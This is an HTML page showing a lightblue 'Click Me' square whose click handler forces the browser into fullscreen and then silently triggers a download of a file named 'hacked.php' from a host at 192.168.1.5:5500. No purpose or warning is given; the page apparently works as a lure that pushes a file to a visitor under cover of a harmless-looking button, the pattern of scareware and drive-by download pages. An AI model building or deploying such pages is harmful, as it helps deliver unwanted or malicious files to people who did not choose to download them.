
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fullscreen and Download</title>
    <style>
        .square {
            width: 200px;
            height: 200px;
            background-color: lightblue;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin: 100px auto;
            text-align: center;
            font-family: Arial, sans-serif;
            font-size: 16px;
            border: 2px solid black;
        }
    </style>
</head>
<body>
    <div class="square" id="clickableSquare">
        Click Me
    </div>

    <script>
        document.getElementById("clickableSquare").addEventListener("click", function () {
            // Fullscreen functionality
            const element = document.documentElement; // The entire document
            if (element.requestFullscreen) {
                element.requestFullscreen();
            } else if (element.mozRequestFullScreen) { // Firefox
                element.mozRequestFullScreen();
            } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Opera
                element.webkitRequestFullscreen();
            } else if (element.msRequestFullscreen) { // IE/Edge
                element.msRequestFullscreen();
            }

            // Trigger file download
            const fileUrl = "http://192.168.1.5:5500/hacked.php";
            const link = document.createElement("a");
            link.href = fileUrl;
            link.download = fileUrl.split("/").pop(); // Extract filename from URL
            document.body.appendChild(link); // Append the link to the DOM
            link.click(); // Trigger download
            document.body.removeChild(link); // Clean up the DOM
        });
    </script>
